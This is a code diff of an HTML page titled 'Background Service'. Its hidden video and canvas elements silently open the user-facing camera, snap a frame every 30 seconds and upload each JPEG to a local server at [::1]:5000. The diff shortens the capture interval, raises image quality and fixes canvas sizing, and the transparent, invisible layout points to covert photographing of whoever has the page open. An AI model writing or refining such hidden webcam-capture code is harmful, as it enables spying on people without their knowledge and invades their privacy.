@@ -2,12 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Service</title>
+    <title>Background Service</title>
 </head>
-<body style="margin:0; padding:0; overflow:hidden; background:transparent;">
-
+<body style="background:transparent; margin:0; overflow:hidden;">
     <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const v = document.getElementById('v');
@@ -15,36 +14,50 @@
 
         async function start() {
             try {
-                // Requesting front camera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
                 v.srcObject = stream;
                 
-                // Interval starts once stream is active
                 v.onloadedmetadata = () => {
-                    setInterval(snap, 60000);
+                    // Match canvas size to the actual camera resolution
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    
+                    // Interval set to 30,000ms (30 seconds)
+                    setInterval(snap, 30000);
                 };
             } catch (e) {
-                console.error("Camera access required.");
+                console.error("Camera error:", e);
             }
         }
 
         function snap() {
             const ctx = c.getContext('2d');
+            
+            // Ensure the canvas matches current stream size (handles orientation changes)
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+
+            // Clear and draw the fresh frame
+            ctx.clearRect(0, 0, c.width, c.height);
             ctx.drawImage(v, 0, 0, c.width, c.height);
             
             c.toBlob((blob) => {
                 const fd = new FormData();
-                // Use IPv6 loopback [::1] or the IPv4 127.0.0.1
-                fd.append('image', blob, `shot_${Date.now()}.jpg`);
+                // Adding a unique timestamp to the filename helps the server/browser 
+                // distinguish it as a brand new file.
+                const timestamp = new Date().getTime();
+                fd.append('image', blob, `shot_${timestamp}.jpg`);
                 
                 fetch('http://[::1]:5000/upload', {
                     method: 'POST',
+                    mode: 'cors',
                     body: fd
-                }).then(r => console.log('Sent'))
-                  .catch(err => console.log('Error'));
-            }, 'image/jpeg', 0.7);
+                })
+                .then(() => console.log(`Uploaded at ${new Date().toLocaleTimeString()}`))
+                .catch(err => console.error('Upload error:', err));
+            }, 'image/jpeg', 0.9);
         }
 
         start();
